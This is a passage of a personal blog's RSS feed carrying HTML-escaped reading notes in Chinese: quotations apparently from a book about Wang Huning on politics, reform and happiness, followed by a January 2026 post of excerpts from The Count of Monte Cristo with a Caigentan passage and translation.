class=&#34;admonition-content&#34;&gt;什么叫政治家？应该是具有至死不渝的信念、学贯中西的知识、高山仰止的人格、高瞻远瞩的目光、百折不挠的毅力、海纳百川的胸襟、纵揽全局的能力，等等。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;不少人讨论很多辩论技巧，但是没有意识到逻辑能力的重要意义，根本意义，这样不能有优秀的辩手。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;又加了一段写幽默和机智的文字。这些东西获得很不容易，一定要来自一种生活的态度，一种对生活超越的态度、认真的态度，或对生命道路的一种超脱的选择。这样才会有幽默，否则不能谈幽默。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;在这样的场合，人往往会有一种悲凉的感觉，越是热闹越是如此。从中感觉到自己生命的存在，感觉到世界是多么强大的外在力量，是可以不依人的感觉和情绪而存在的力量，是可以不依人的理性和理想而存在的力量。在平平淡淡的生活中，人们往往忘记了自己，觉得自己融入了社会和世界。但是，当世界沸腾起来时，才发现自己孤独安静的存在。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;社会就是这样的一种力量，使一个平凡的人突然在别人的眼中变得不平凡了。如果自己也认为是这样，就难以把握自己了。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;任何一种改革总是会在解决一些旧矛盾的同时，产生新矛盾。然后人们又要花力气来解决新矛盾。社会就是在这个过程中进步的。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;王沪宁也许不是一个均质的整体，而是一个变化的整体，他不断创新自我和消除自我。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;人总是一定时代的产物。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;人的生命总是要有寄托的，在失去了父母之后，你会突然觉得这样的寄托是重要的。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;中国社会的发展，慢慢人们也明白了道理，这样大的社会不可能一夜之间发生变革，变成一个全新的世界，而要逐渐地进步。在改革的设计上，也不能一下子就拿出整套的方案，而是要摸着石头过河。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;人往往会迷惑的，越集中精力越迷惑，有时散漫一些，反而不会糊涂。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;当一切美好都可以被金钱所调动，或者为金钱所驱动的时候，美好就不美好了。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;我突然感到自己不够坦诚。看问题也是这样，不是没有缺点的，问题是自己也要坦诚，不能自己都是优点，别人都是缺点。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;人，必须活得有自尊和骄傲。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;没有幸福的欲望，也就没有痛苦。痛苦往往是伴随着对幸福的追求的，而不是伴随着幸福本身。所以要怀疑的不是幸福本身，而是每个人主观状态中的希望。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;幸福之事，可欲而不可求，可求而不可执。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;p&gt;这句话来自王教授的学生：&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;人们看待一个有道德的人，透出的目光是亲切，看待一个有权力的人，透出的目光是敬畏，只有看待一个有知识的人，目光中才盈溢着无限的尊重，并饱含着由衷的敬佩。我向往那份尊重和敬佩。再有，我很欣赏书页中那一片于喧闹、复杂和浮噪之中仍可守的宁静的小天地。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;要注意确立自己在历史中的方位，这样才能更加深入地研究问题。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;学问之事，全在贡献于社会，清淡出自身，并不在乎别人如何说。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;p&gt;“太阳都有人觉得他刺眼。总想让每一个人都满意，总害怕出现一点错误，这是幼稚的”。&lt;/p&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;在探索真理的过程中，最难的是否定自己所有的创见，不管他们曾给你带来什么荣誉，同时追求新的创见，不管它们会让你失去什么。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;快乐也好，害怕也好，生命总是要流失。要在生命流失的过程中，尽量地实现自己的理想和意志，完成人的选择，这将是有价值的生命。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;</description>
    </item>
    <item>
      <title>《基督山伯爵》</title>
      <link>http://localhost:1313/posts/read_jdsbj/</link>
      <pubDate>Tue, 13 Jan 2026 00:25:03 +0800</pubDate>
      <guid>http://localhost:1313/posts/read_jdsbj/</guid>
      <category domain="http://localhost:1313/categories/reading/">Reading</category>
      <description>&lt;h2 class=&#34;heading-element&#34; id=&#34;摘录&#34;&gt;&lt;span&gt;摘录&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e6%91%98%e5%bd%95&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;学过的东西，不一定是懂得的东西。有两种人，一种是书蠹，一种是学者：记忆造就前一种人，哲学造就后一种人&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;一个让人见了就伤心的人，你哪怕心肠再好，也不会总是去看他的&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;p&gt;“大家都喜欢正面的事情，负面的情绪，事件都会影响到自己，从而发现，自己的抱怨越来越多人懒得理，没人有空听你的事情。每个人都有生活上的不易，比你不易的，觉得你庸人自扰抱怨唉声叹气很没必要；比你稍微好一点的，感叹完你的不易之后会开始不理解你为什么不走出来，害怕你的难过，从而躲得远远的。要是以此认为世界，别人都很冷漠，确实，世界很冷漠，但不对的是，不要去憎恨责怪他人对你的无情，因为你本人也一样”&lt;/p&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;我们常常同快乐擦身而过，却对它视而不见；即使我们看到它而且注意到了它，可还是认不出它&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;时间和沉默，是治疗精神创伤的两帖药。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;自知要比知人难得多，而知人要比自知有用得多。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;然而，无论这份恩惠怎么珍贵，它还是没法跟我内心的满足相比的。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;p&gt;《菜根谭》：“施恩者，内不见己，外不见人，则斗粟可当万钟之惠；利物者，计己之施，责人之报，虽百镒难成一文之功”。译文：施恩惠给别人的人，不可以将这种恩惠记在心上，更不应该存着让别人赞美的念头，这样即使是向别人布施了一斗米，也可以收到千万石米的回报；用财物帮助别人的人，如果总计较自己对别人的施舍，而且要求别人报答，这样即使是付出了一百镒，也难收到一文钱的功德。&lt;/p&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;从总体上来研究人类，而您研究的是个体，每天接触的都是个案。我想，从整体到局部，要比从局部到整体容易得多。有一条代数公理告诉我们，应该由已知数来求未知数，而不该由未知数来求已知数……&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;您只看见机器在运转，而没看见驱使它运转的那位了不起的机械师。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;我只有两个对手——是对手而不是征服者，因为凭我的坚忍，它们最终会向我屈服——那就是距离和时间。第三个对手是最可怕的，那就是凡人都难免的一死。只有死亡才能在我达到既定目标之前，使我停在前进的路上。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;难道太阳为我做过什么事了吗？没有。它温暖了我，让我在阳光中见到了您，如此而已。难道花的香味为我做过什么事了吗？没有。但这香味唤起了我某种愉悦的感觉。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;最奇妙的东西是什么呢？是我们无法懂得的东西。我们内心所向往的，又是什么东西呢？是我们无法拥有的东西。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;我们的自私，往往会给属于自己的东西蒙上一层耀眼的光彩。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;您只要把随便哪个国家的一个人研究透了，也就把这个种族完全弄明白了，道理是一样的。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;生活中的许多事情都是碰运气的，所以幸福到了手边，就得一把抓住。&lt;/div&gt;&#xD;&#xA;    